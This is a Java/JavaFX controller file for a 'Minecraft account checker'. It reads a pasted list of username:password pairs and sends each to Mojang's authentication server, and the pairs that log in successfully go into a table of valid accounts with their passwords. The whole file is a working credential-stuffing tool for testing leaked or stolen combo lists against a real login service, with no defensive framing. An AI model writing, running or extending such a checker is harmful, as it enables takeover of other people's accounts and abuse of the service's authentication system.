package mcaccountchecker.controllers;

import java.io.OutputStream;
import java.net.URL;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ProgressBar;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableView;
import javafx.scene.control.TextArea;

import javax.net.ssl.HttpsURLConnection;

import mcaccountchecker.models.Account;

public class MainController
{
	
	@FXML private Button startButton;
	@FXML private Button resetButton;
	
	@FXML private ProgressBar progressBar;
	
	@FXML private TextArea accountList;
	
	@FXML private TableView<Account> validAccountTable;
	@FXML private TableColumn<Account, String> usernameColumn;
	@FXML private TableColumn<Account, String> passwordColumn;
	
	private ObservableList<Account> personData = FXCollections.observableArrayList();
	
	private int count;
	
	@FXML
	public void startButtonClick()
	{
		if(accountList.getText().length() == 0 || !accountList.getText().contains(":")) return;
		
		count = 0;
		progressBar.setProgress(0);
		
		startButton.setDisable(true);
		resetButton.setDisable(true);
		personData.clear();
		
		String[] values = accountList.getText().split("\n");
		
		new Thread()
		{
			public void run()
			{
				for(int i = 0; i < values.length; i++)
				{
					String[] details = values[i].split(":");
					if(details.length != 2) continue;
					if(isValidAccount(details[0], details[1])) personData.add(new Account(details[0], details[1]));
					
					Platform.runLater(() -> {
						progressBar.setProgress(getPercentage(values.length));
					});
				}
				
				Platform.runLater(() -> {
					resetButton.setDisable(false);
					startButton.setDisable(false);
				});
			}
		}.start();
	}
	
	private double getPercentage(int values)
	{
		return (double) ++count / values;
	}
	
	private boolean isValidAccount(String username, String password)
	{
		HttpsURLConnection con = null;
		
		try
		{
			byte[] dataToSend = new String("{\"agent\": { \"name\": \"Minecraft\", \"version\": 1}, \"username\": \"" + username + "\", \"password\": \"" + password + "\" }").getBytes("UTF-8");
		
			con = (HttpsURLConnection) new URL("https://authserver.mojang.com/authenticate").openConnection();
			con.setRequestMethod("POST");
			con.setRequestProperty("Content-Type", "application/json");
			con.setDoOutput(true);
			con.setReadTimeout(12000);
			
			OutputStream wr = con.getOutputStream();
			wr.write(dataToSend, 0, dataToSend.length);
			wr.close();
			
			return con.getResponseCode() == 200;
		}
		catch(Exception e) { return false; }
	}
	
    @FXML
    private void initialize() 
    {
    	usernameColumn.setCellValueFactory(cellData -> cellData.getValue().getUsername());
    	passwordColumn.setCellValueFactory(cellData -> cellData.getValue().getPassword());
    	
    	validAccountTable.setItems(personData);
    }
	
	@FXML
	public void resetButtonClick()
	{
		personData.clear();
		accountList.clear();
		
		progressBar.setProgress(0);
		startButton.setDisable(false);
	}
	
}
